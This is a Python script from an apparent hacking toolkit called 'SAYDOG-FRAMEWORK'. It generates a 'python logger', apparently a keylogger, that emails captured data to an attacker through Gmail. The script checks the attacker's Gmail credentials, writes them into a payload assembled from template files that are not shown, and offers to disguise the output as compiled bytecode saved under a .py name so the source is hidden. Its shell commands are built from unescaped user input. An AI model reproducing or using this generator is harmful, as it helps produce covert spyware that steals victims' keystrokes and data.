import os
import sys
import time
import getpass
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

u='\033[4m'
w='\033[00m'
r='\033[91m'
b='\033[34m'
y='\033[33m'
g='\033[32m'

def menu():
        try:
                print (w)
                print ("Please login with google account !")
                print (w)
                main()
        except KeyboardInterrupt:
                sys.exit(0)

def main():
        usr = str(input(w+" E-mail: "))
        pwd = getpass.getpass(w+" Pass: ")
        print ("")
        try:
                print (b+"[+]"+w+" trying to login as "+usr)
                msg = MIMEMultipart()
                msg['From'] = usr
                msg['To'] = usr
                msg['Subject'] = "SAYDOG-FRAMEWORK"
                body = "successfully login at python logger"
                test = usr
                msg.attach(MIMEText(body, 'plain'))
                server = smtplib.SMTP('smtp.gmail.com', 587)
                server.starttls()
                server.login(usr, pwd)
                text = msg.as_string()
                server.sendmail(usr, test, text)
                server.quit()
        except smtplib.SMTPAuthenticationError:
                print ("")
                print (w+"["+r+"\033[0;30m\033[41m LOGIN FAILED \033[00m"+w+"]")
                print (r+"[!] username: "+w+usr)
                print (r+"[!] password: "+w+pwd)
                print ("")
                main()
        except TypeError:
                print (r+"[!] username or password error not found")
                print ("")
                main()
        else:
                print (b+"[+]"+w+" login successfuly ")
                print ("")
                to = str(input(w+" receive e-mail "+w+"=> "))
                nfile = str(input(w+"   files name   "+w+"=> "))
                ofile = str(input(w+"  save file to  "+w+"=> "))
                print ("")
                print (b+"[+]"+w+" generate python logger code")
                os.system("cat log1 > log.py;echo '"+'email = "'+usr+'"'+"' >> log.py;echo 'passw = "+'"'+pwd+'"'+"' >> log.py;echo 'to = "+'"'+to+'"'+"' >> log.py;cat log2 >> log.py;cat log.py > "+ofile+"/"+nfile+".py;rm log.py")
                time.sleep(5)
                print (b+"[+]"+w+" successfully generated python logger")
                print (b+"[+]"+w+" language using: python3.8")
                print (b+"[+]"+w+" requirements module: yagmail")
                print (b+"[+]"+w+" file saved as "+ofile+"/"+nfile+".py")
                print ("")
                dog = str(input(w+"Do you want to hide the source code? (y/n) "))
                if dog == "y" or dog == "Y":
                        print ("")
                        print (b+"[+]"+w+" converting the source code")
                        time.sleep(3)
                        os.system("python3 -m py_compile "+ofile+"/"+nfile+".py;cat "+ofile+"/__pycache__/"+nfile+".cpython-38.pyc > "+ofile+"/"+nfile+".py;rm -rf "+ofile+"/__pycache__")
                        print (b+"[+]"+w+" python logger has been converted")
                        print ("")
                        dog = str(input(w+"[ enter ]"))
                        if dog == " ":
                                sys.exit(0)
                        else:
                                sys.exit(0)
                else:
                        print ("")
                        dog = str(input(w+"[ enter ]"))
                        if dog == " ":
                                sys.exit(0)
                        else:
                                sys.exit(0)

if "__main__" == __name__:
    if "--genlogger-run" in sys.argv:
        menu()
    else:
            os.system("saydog")